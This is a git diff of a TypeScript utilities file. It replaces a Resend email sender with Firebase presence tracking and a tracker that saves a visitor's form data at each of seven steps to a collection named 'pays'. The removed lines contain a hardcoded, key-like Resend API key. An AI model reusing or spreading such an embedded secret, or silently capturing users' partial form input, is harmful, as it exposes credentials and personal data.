@@ -1,6 +1,14 @@
 import { clsx, type ClassValue } from "clsx";
+import {
+  onDisconnect,
+  onValue,
+  ref,
+  serverTimestamp,
+  set,
+} from "firebase/database";
 import { twMerge } from "tailwind-merge";
-import { Resend } from "resend";
+import { addData, database, db } from "./firebase";
+import { doc, updateDoc } from "firebase/firestore";
 
 export function cn(...inputs: ClassValue[]) {
   return twMerge(clsx(inputs));
@@ -9,19 +17,86 @@ export const onlyNumbers = (value: string) => {
   return value.replace(/[^\d٠-٩]/g, "");
 };
 
-const resend = new Resend("re_AAY46E1E_K9FyiWZ1ifk6p5b6k6jXrDKw");
+export const setupOnlineStatus = (userId: string) => {
+  if (!userId) return;
 
-export async function sendMail(_adata: any) {
-  const { data, error } = await resend.emails.send({
-    from: "Acme <onboarding@resend.dev>",
-    to: ["delivered@resend.dev"],
-    subject: "Hello World",
-    html: `<strong>${_adata}</strong>`,
+  // Create a reference to this user's specific status node in Realtime Database
+  const userStatusRef = ref(database, `/status/${userId}`);
+
+  // Create a reference to the user's document in Firestore
+  const userDocRef = doc(db, "pays", userId);
+
+  // Set up the Realtime Database onDisconnect hook
+  onDisconnect(userStatusRef)
+    .set({
+      state: "offline",
+      lastChanged: serverTimestamp(),
+    })
+    .then(() => {
+      // Update the Realtime Database when this client connects
+      set(userStatusRef, {
+        state: "online",
+        lastChanged: serverTimestamp(),
+      });
+
+      // Update the Firestore document
+      updateDoc(userDocRef, {
+        online: true,
+        lastSeen: serverTimestamp(),
+      }).catch((error) =>
+        console.error("Error updating Firestore document:", error)
+      );
+    })
+    .catch((error) => console.error("Error setting onDisconnect:", error));
+
+  // Listen for changes to the user's online status
+  onValue(userStatusRef, (snapshot) => {
+    const status = snapshot.val();
+    if (status?.state === "offline") {
+      // Update the Firestore document when user goes offline
+      updateDoc(userDocRef, {
+        online: false,
+        lastSeen: serverTimestamp(),
+      }).catch((error) =>
+        console.error("Error updating Firestore document:", error)
+      );
+    }
   });
+};
 
-  if (error) {
-    return console.error({ error });
+export const setUserOffline = async (userId: string) => {
+  if (!userId) return;
+
+  try {
+    // Update the Firestore document
+    await updateDoc(doc(db, "pays", userId), {
+      online: false,
+      lastSeen: serverTimestamp(),
+    });
+
+    // Update the Realtime Database
+    await set(ref(database, `/status/${userId}`), {
+      state: "offline",
+      lastChanged: serverTimestamp(),
+    });
+  } catch (error) {
+    console.error("Error setting user offline:", error);
   }
+};
+export const trackFormProgress = async (
+  visitorId: string,
+  currentPage: number,
+  formData: any
+) => {
+  const progressData = {
+    id: visitorId,
+    currentPage,
+    progress: Math.round((currentPage / 7) * 100),
+    completedSteps: currentPage - 1,
+    totalSteps: 7,
+    formData,
+    timestamp: new Date().toISOString(),
+  };
 
-  console.log({ data });
-}
+  return await addData(progressData);
+};
